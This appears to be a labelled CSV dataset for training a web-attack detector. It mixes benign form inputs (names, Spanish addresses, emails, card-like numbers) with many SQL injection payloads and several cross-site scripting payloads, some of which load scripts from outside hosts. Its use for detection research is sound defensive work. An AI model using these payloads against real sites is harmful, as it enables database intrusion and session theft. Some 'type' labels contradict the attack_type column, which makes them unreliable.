Text,attack_type,Label,type
lev@ozlon.ke,norm,0,normal
maurici garrudo,norm,0,normal
"1%') or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
6052,norm,0,normal
+delaxar,norm,0,normal
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
9127471588357421,norm,0,normal
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
05196,norm,0,normal
1'||(select 'feki' where 4082=4082 and (3587=4207)*4207)||',sqli,1,sql
hewitt,norm,0,normal
"1"")) as qqhm where 7182=7182;if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
"<script a="">"" '' id=xss src=""http://ha.ckers.org/xss.js""></script>",xss,2,xss
4847935769774930,norm,0,normal
1'||(select 'cgup' from dual where 5383=5383 waitfor delay '0:0:5'--,sqli,1,sql
"1 where 5266=5266 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
-1436' or 5699=5783--,sqli,1,sql
denno,norm,0,normal
"1%"")) and elt(1210=1210,sleep(5)) and ((""%""=""",sqli,1,normal
iracema,norm,0,normal
"-4054"" or 2824=4788--",sqli,1,sql
06650,norm,0,normal
"""x:alert"" onerror=""eval(src+'(0)')"">",xss,2,xss
rosenblatt@hormigon-impreso.az,norm,0,normal
-8615))) or 4039=9144,sqli,1,normal
2533,norm,0,normal
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""frgb"" like ""frgb",sqli,1,sql
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
06773874y,norm,0,normal
"1') as cgsz where 7194=7194 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
"1%""))) or elt(6272=6272,sleep(5)) and (((""%""=""",sqli,1,normal
abarn,norm,0,normal
"1%"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1,sql
new,norm,0,normal
ardevol herrador,norm,0,normal
"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>",xss,2,xss
31383,norm,0,normal
08776,norm,0,normal
archie,norm,0,normal
"-6095"") as hygc where 8142=8142 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1"") order by 1--",sqli,1,sql
9978092999259297,norm,0,normal
auyeung,norm,0,normal
41719663d,norm,0,normal
ranganad,norm,0,normal
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></object>",xss,2,sql
"1"") as jidc where 6093=6093 and 9198=9198--",sqli,1,sql
"-2365)) union all select 8190,8190#",sqli,1,sql
comba,norm,0,normal
wenner@rpdkorea.nr,norm,0,normal
3291164782388110,norm,0,normal
kesling8,norm,0,normal
2230,norm,0,normal
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",sqli,1,sql
harmonie,norm,0,normal
5575673482668784,norm,0,normal
"-1558 or elt(3306=2272,2272)-- ioxt",sqli,1,sql
"<img id=xss src=""blah""onmouseover=""alert('xss');"">",xss,2,sql
2780,norm,0,normal
frau puigveh,norm,0,normal
"-3177')) union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",sqli,1,sql
daya basulto,norm,0,normal
49832,norm,0,normal
"1)) as cdhd where 2958=2958 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
ag-uzadura,norm,0,normal
31494,norm,0,normal
cortegana,norm,0,normal
ramaje,norm,0,normal
"""#"">{alert(1)}</script>;1",xss,2,xss
33245427p,norm,0,normal
1' in boolean mode) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#,sqli,1,sql
"1') union all select null,null,null,null,null,null#",sqli,1,sql
09110,norm,0,normal
marsh@comerciosaspe.ke,norm,0,normal
0598963816827000,norm,0,normal
"castellar, el",norm,0,normal
cowling@minimizar.bz,norm,0,normal
21,norm,0,normal
campos del paraso,norm,0,normal
pu128,norm,0,normal
woolwine0,norm,0,normal
7857158360903973,norm,0,normal
8i273e,norm,0,normal
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj",sqli,1,sql
1') and (3020=3020)*6703 and ('lhfa'='lhfa,sqli,1,normal
desyerbadora,norm,0,normal
1 rlike (select (case when (8314=5463) then 1 else 0x28 end)),sqli,1,sql
"-4340)) or make_set(9354=9354,7185) and ((8505=8505",sqli,1,normal
"1""))) and make_set(8403=8403,8899) and (((""czvm"" like ""czvm",sqli,1,normal
35742173n,norm,0,normal
"-1597"" where 5933=5933 or 3038=3038",sqli,1,normal
ming-yua,norm,0,normal
"-6118 union all select 5906,5906,5906,5906,5906#",sqli,1,sql
"1'||(select 'ycya' from dual where 3536=3536 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1 where 9932=9932;select sleep(5)--,sqli,1,sql
"-1157)) as sxie where 7118=7118 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
p8e8079zu58o,norm,0,normal
1))) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
ji-chuu,norm,0,normal
-3821') or 9323=9323#,sqli,1,normal
"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",sqli,1,sql
-4082)) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((7874=7874,sqli,1,sql
"1) as lfra where 2669=2669 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
45569,norm,0,normal
ayat rozas,norm,0,normal
"calle valdibaez 185,",norm,0,normal
machac$ada,norm,0,normal
a73p3i4,norm,0,normal
*ayustar,norm,0,normal
"c/ cierzo, 189,",norm,0,normal
1096,norm,0,normal
"1))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((3977=3977",sqli,1,sql
9019896710304929,norm,0,normal
bumatai@aldufa.pf,norm,0,normal
barabash0,norm,0,normal
1%');select case when 4488=5522 then 1 else null end--,sqli,1,sql
1' and (select * from (select(sleep(5)))fzno) and 'mepp'='mepp,sqli,1,sql
"1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
cruey,norm,0,normal
"1)) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%""));waitfor delay '0:0:5'--",sqli,1,sql
berrell@lingote.com.nf,norm,0,normal
1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--,sqli,1,sql
"1"")) rlike (select * from (select(sleep(5)))sgvo) and ((""grct""=""grct",sqli,1,sql
t20s3da436,norm,0,normal
"1'||(select 'flre' where 8250=8250 or 8421=(select count(*) from generate_series(1,5000000)))||'",sqli,1,sql
09529349n,norm,0,normal
"-1766""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""ydzq"" like ""ydzq",sqli,1,sql
1');(select * from (select(sleep(5)))srmq),sqli,1,sql
1');waitfor delay '0:0:5' and ('eaxu'='eaxu,sqli,1,sql
"1"") as dlfq where 8410=8410;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
13100768z,norm,0,normal
"calle rocafort, 169 4c",norm,0,normal
9051495468288465,norm,0,normal
4654406617611743,norm,0,normal
1) as iqkf where 7780=7780;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
1) as usnn where 3201=3201;select pg_sleep(5)--,sqli,1,sql
2isnomo,norm,0,normal
"pl. de belen 153, 6?c",norm,0,normal
lusa,norm,0,normal
lladurs,norm,0,normal
"1) where 6304=6304;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"calle rio piguea, 5,",norm,0,normal
castrillo matajudos,norm,0,normal
antih sacido,norm,0,normal
"calle isis, 152,",norm,0,normal
remberta,norm,0,normal
verrilli,norm,0,normal
apoderado,norm,0,normal
45591,norm,0,normal
hans,norm,0,normal
galln,norm,0,normal
"c/ mare de deu de fatima, 165",norm,0,normal
9457,norm,0,normal
1' in boolean mode);if(3392=4422) select 3392 else drop function xsqq--,sqli,1,sql
cervera brcena,norm,0,normal
8143,norm,0,normal
"1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
sibirskaia@euskalcasino.es,norm,0,normal
"c/ pomba, 97",norm,0,normal
4148689549974834,norm,0,normal
v8s684t29a,norm,0,normal
22193,norm,0,normal
11653982c,norm,0,normal
asermonada,norm,0,normal
manchita,norm,0,normal
59952544p,norm,0,normal
1) as qywz where 1864=1864 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
aulakh,norm,0,normal
1)) as muyz where 6105=6105;begin dbms_lock.sleep(5); end--,sqli,1,sql
"1"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1) where 9687=9687 and elt(9607=9432,9432)--",sqli,1,sql
ambatll comalada,norm,0,normal
05301323f,norm,0,normal
gimena,norm,0,normal
3889877274730885,norm,0,normal
0904159527442646,norm,0,normal
liliana,norm,0,normal
gunther@nik.com.tn,norm,0,normal
chen-che,norm,0,normal
scheff_guiffre@interpretacion-diccionario-y-significado-de-los-s,norm,0,normal
08349,norm,0,normal
1')) as gchn where 5856=5856;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
1') where 1645=1645 rlike sleep(5)--,sqli,1,sql
-6433%')) or 9323=9323#,sqli,1,normal
46960,norm,0,normal
ilusiva,norm,0,normal
valleseco,norm,0,normal
1'||(select 'zzkx' where 3270=3270 and 2006=2006,sqli,1,sql
"escultor bauls, 96,",norm,0,normal
tila,norm,0,normal
"-3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",sqli,1,sql
1'+(select 'mdxt' where 2733=2733 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
">""<input type=""image"" src=""javascript:document.cookie=true;"">",xss,2,xss
"<script a="">"" src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",xss,2,xss
"1"") and elt(3114=3114,sleep(5))#",sqli,1,normal
ferris,norm,0,normal
"-7963'+(select 'kxzh' where 7039=7039 union all select 7039,7039,7039,7039,7039,7039--",sqli,1,sql
62381470l,norm,0,normal
1' or sleep(5) and 'yudo'='yudo,sqli,1,normal
pepet@naturalchild.co,norm,0,normal
"1%""))) union all select null,null,null,null,null--",sqli,1,sql
9217704235883409,norm,0,normal
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1 where 6408=6408 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
pastukhov@pecher.iq,norm,0,normal
1';begin user_lock.sleep(5); end,sqli,1,sql
"-2605"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""cikb"" like ""cikb",sqli,1,sql
"-6548%"") union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",sqli,1,sql
"c/ cala bona, 80,",norm,0,normal
-1<script>document.cookie=true;</script>,xss,2,xss
"-6084')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('dfcp'='dfcp",sqli,1,sql
1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1,sql
62162273n,norm,0,normal
"1"") where 8407=8407 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
tauja,norm,0,normal
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,sqli,1,sql
descabal!gadura,norm,0,normal
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz",sqli,1,sql
reyero,norm,0,normal
"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""eqmy""=""eqmy",sqli,1,sql
6657407608418544,norm,0,normal
"-6523"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""bwrb"" like ""bwrb",sqli,1,sql
50529,norm,0,normal
botellas girbau,norm,0,normal
shemwell,norm,0,normal
caas,norm,0,normal
8365998592191509,norm,0,normal
1)) as kiqk where 7366=7366 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
26064480y,norm,0,normal
"1)) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((5336=5336",sqli,1,normal
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('mevd'='mevd",sqli,1,sql
timms,norm,0,normal
poomjai3@deuxmanagement.ch,norm,0,normal
foubert,norm,0,normal
43761,norm,0,normal
gaubert@clementelr.mw,norm,0,normal
16300,norm,0,normal
-1468'))) or 4875=6163#,sqli,1,normal
9224,norm,0,normal
1%');select sleep(5) and ('%'=',sqli,1,sql
9481894123052720,norm,0,normal
"1')) as xjen where 6791=6791 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
copleston-guerrasio@risiberia.ng,norm,0,normal
malandrn,norm,0,normal
luciano,norm,0,normal
7uxcea,norm,0,normal
"1' where 7104=7104 union all select null,null,null,null,null,null,null#",sqli,1,sql
eglevsky-dux@tacticlinks.ch,norm,0,normal
"-1830"")) as bptv where 4805=4805 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
"1%"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
34361279s,norm,0,normal
1')) as oyad where 7161=7161 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('crosssitescripting');+adw-/script+ad4-",xss,2,sql
esguince,norm,0,normal
orea,norm,0,normal
"1 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
floor@aebo.af,norm,0,normal
"1'+(select 'ncny' where 5634=5634;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
1%' order by 1#,sqli,1,normal
alcal de la selva,norm,0,normal
herrera,norm,0,normal
blankenship@likeanangel.tc,norm,0,normal
alcolea del pinar,norm,0,normal
caada,norm,0,normal
1'+(select zmbu where 8685=8685 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',sqli,1,sql
1' where 2958=2958;if(6647=2179) select 6647 else drop function zvlq--,sqli,1,sql
kuldip8,norm,0,normal
kouichir,norm,0,normal
"1',(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,1,sql
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'mnod'='mnod",sqli,1,normal
arbuckle,norm,0,normal
"amargos, 17, 1?e",norm,0,normal
carlo_salcedo4@nomao.wf,norm,0,normal
gloriano,norm,0,normal
91220241x,norm,0,normal
valbuena de duero,norm,0,normal
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""tpxo"" like ""tpxo",sqli,1,sql
"-9237') union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",sqli,1,sql
1'+(select goec where 9460=9460 rlike (select (case when (4740=1203) then 1 else 0x28 end)))+',sqli,1,sql
calle la fuente 116 2?e,norm,0,normal
bockaj,norm,0,normal
16806738v,norm,0,normal
vai gala,norm,0,normal
en7repa2ecerse,norm,0,normal
1))) and 9198=9198--,sqli,1,sql
-7535) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
"1%"")) and 4595=4595#",sqli,1,normal
cadaqus,norm,0,normal
18567,norm,0,normal
-9840')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dzlp'='dzlp,sqli,1,sql
c/ quilichao 85,norm,0,normal
corella,norm,0,normal
pascuet landivar,norm,0,normal
2301580169203669,norm,0,normal
"1"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""sjiz"" like ""sjiz",sqli,1,sql
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""qgle"" like ""qgle",sqli,1,sql
espn boixad,norm,0,normal
miscelnea,norm,0,normal
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
herbers,norm,0,normal
44588,norm,0,normal
de8atem762rse,norm,0,normal
4376,norm,0,normal
1764884801392734,norm,0,normal
paseo don juan de borbon 90 3?c,norm,0,normal
08182,norm,0,normal
-5764 or 3038=3038,sqli,1,normal
7626,norm,0,normal
trisha,norm,0,normal
"-4327"" or make_set(3107=1781,1781) and ""lclf"" like ""lclf",sqli,1,normal
"1""))) and make_set(6751=8128,8128) and (((""uhiy""=""uhiy",sqli,1,normal
75n63d25,norm,0,normal
snair,norm,0,normal
mirna,norm,0,normal
-1492 where 2788=2788 union all select 2788#,sqli,1,sql
pablo,norm,0,normal
minera dauns,norm,0,normal
2815769225379997,norm,0,normal
3600920272663929,norm,0,normal
"calle tarragona, 185 11g",norm,0,normal
felip campos,norm,0,normal
6360914919102158,norm,0,normal
h4a3pa63,norm,0,normal
1<script >prompt(962477)</script>,xss,2,xss
navas de san juan,norm,0,normal
7380226598430715,norm,0,normal
3465134997553259,norm,0,normal
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",sqli,1,sql
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'psdl' like 'psdl,sqli,1,sql
"1')) as kdwc where 5906=5906 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
01472954b,norm,0,normal
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
doradura,norm,0,normal
"-2009%' union all select 1991,1991#",sqli,1,sql
"<xml id=""x""><a><b><script>alert('xss');</script>;<b></a></xml>",xss,2,xss
73949315z,norm,0,normal
"-6775"" union all select 7484,7484#",sqli,1,sql
"1%' union all select null,null,null,null--",sqli,1,sql
radresa aja,norm,0,normal
"-3359 union all select 4675,4675,4675--",sqli,1,sql
"1%"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1%"") and make_set(8403=8403,8899) and (""%""=""",sqli,1,normal
carbunclo,norm,0,normal
zubero arimany,norm,0,normal
antero,norm,0,normal
81177297q,norm,0,normal
lora del ro,norm,0,normal
russo,norm,0,normal
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",sqli,1,sql
gomila serch,norm,0,normal
28614822q,norm,0,normal
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",sqli,1,sql
gasser ortega,norm,0,normal
c/ auroros 173,norm,0,normal
"-5204"") union all select 7186,7186,7186--",sqli,1,sql
xammar,norm,0,normal
val de san lorenzo,norm,0,normal
55,norm,0,normal
34486,norm,0,normal
zas,norm,0,normal
10260,norm,0,normal
ensminge,norm,0,normal
irado,norm,0,normal
tilden.auerbach4@cochesautomaticos.ru,norm,0,normal
1) where 4780=4780;begin dbms_lock.sleep(5); end--,sqli,1,sql
atherton@madrid2012.ht,norm,0,normal
denni,norm,0,normal
valcour@piensoparaperros.dj,norm,0,normal
"1"") and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
earline,norm,0,normal
"<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",xss,2,xss
0cald53sm6,norm,0,normal
"1')) as qzyp where 5081=5081 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
"-7423 or make_set(9354=9354,7185)-- hprc",sqli,1,sql
"quinita flores 75,",norm,0,normal
02054707w,norm,0,normal
kenna.losch@lapasteleria.co,norm,0,normal
reynna,norm,0,normal
1'+(select 'diet' where 7004=7004 rlike sleep(5))+',sqli,1,sql
"-7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",sqli,1,sql
mizerk,norm,0,normal
"<img dyn id=xss src=""javascript:alert('xss')"">",xss,2,xss
50678,norm,0,normal
"-4828'+(select qxnw where 9488=9488 union all select 9488,9488--",sqli,1,sql
"&<script>alert('xss');</script>"">",xss,2,xss
rode@sayuela.kw,norm,0,normal
artiachi menacho,norm,0,normal
66376502c,norm,0,normal
<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,xss,2,xss
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='",sqli,1,sql
64996573e,norm,0,normal
1%')));waitfor delay '0:0:5' and ((('%'=',sqli,1,sql
09471,norm,0,normal
7359610101148401,norm,0,normal
obsequ.iosa,norm,0,normal
carulla,norm,0,normal
"-3775') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1') where 8118=8118;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
nuo,norm,0,normal
00207473j,norm,0,normal
mombuey,norm,0,normal
"1) as fhvr where 5544=5544;iif(5257=5257,1,1/0)",sqli,1,sql
"1"")) and 8329=5584#",sqli,1,normal
tasies cirujano,norm,0,normal
-2181') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('wyez'='wyez,sqli,1,sql
"calle maria marin, 196,",norm,0,normal
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('ngxz'='ngxz",sqli,1,sql
24120558k,norm,0,normal
"1"") as ronb where 9368=9368;(select * from (select(sleep(5)))srmq)--",sqli,1,sql
23456317c,norm,0,normal
"-6073""))) or 9502=2012#",sqli,1,normal
nagaraja,norm,0,normal
"1)) as bgdm where 3473=3473 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
"c/ escultor julio gonzalez 88,",norm,0,normal
noviercas,norm,0,normal
05215,norm,0,normal
b9rl5ingar,norm,0,normal
"1'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1) where 2781=2781 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
e6tal1g68,norm,0,normal
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dwcy""=""dwcy",sqli,1,sql
48c49p59a,norm,0,normal
"<script>alert(""crosssitescripting"")</script>"";' >",xss,2,xss
"1%"") and 8715=5529",sqli,1,normal
ferreres perandrs,norm,0,normal
granada,norm,0,normal
50138,norm,0,normal
"1 where 7158=7158 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1,(select (case when (1255=8025) then 1 else 1255*(select 1255 from mysql.db) end))",sqli,1,sql
-7175' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'upzo'='upzo,sqli,1,sql
"microscopio, 65",norm,0,normal
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('cylu'='cylu",sqli,1,normal
29061025l,norm,0,normal
12413,norm,0,normal
mudie,norm,0,normal
"-6333""))) union all select 9851,9851,9851,9851,9851,9851--",sqli,1,sql
-4331) as inpx where 9804=9804 union all select 9804#,sqli,1,sql
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
alhama de murcia,norm,0,normal
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'nepn'='nepn",sqli,1,sql
bouchot betancur,norm,0,normal
05298,norm,0,normal
1 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"calle sergio luna, s/n 11g",norm,0,normal
xe2foba,norm,0,normal
candelario,norm,0,normal
yamile de francisco,norm,0,normal
aluino,norm,0,normal
fiodorov@contactomujeres.kr,norm,0,normal
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""njdu"" like ""njdu",sqli,1,sql
larissa,norm,0,normal
ambros,norm,0,normal
femke,norm,0,normal
quintino,norm,0,normal
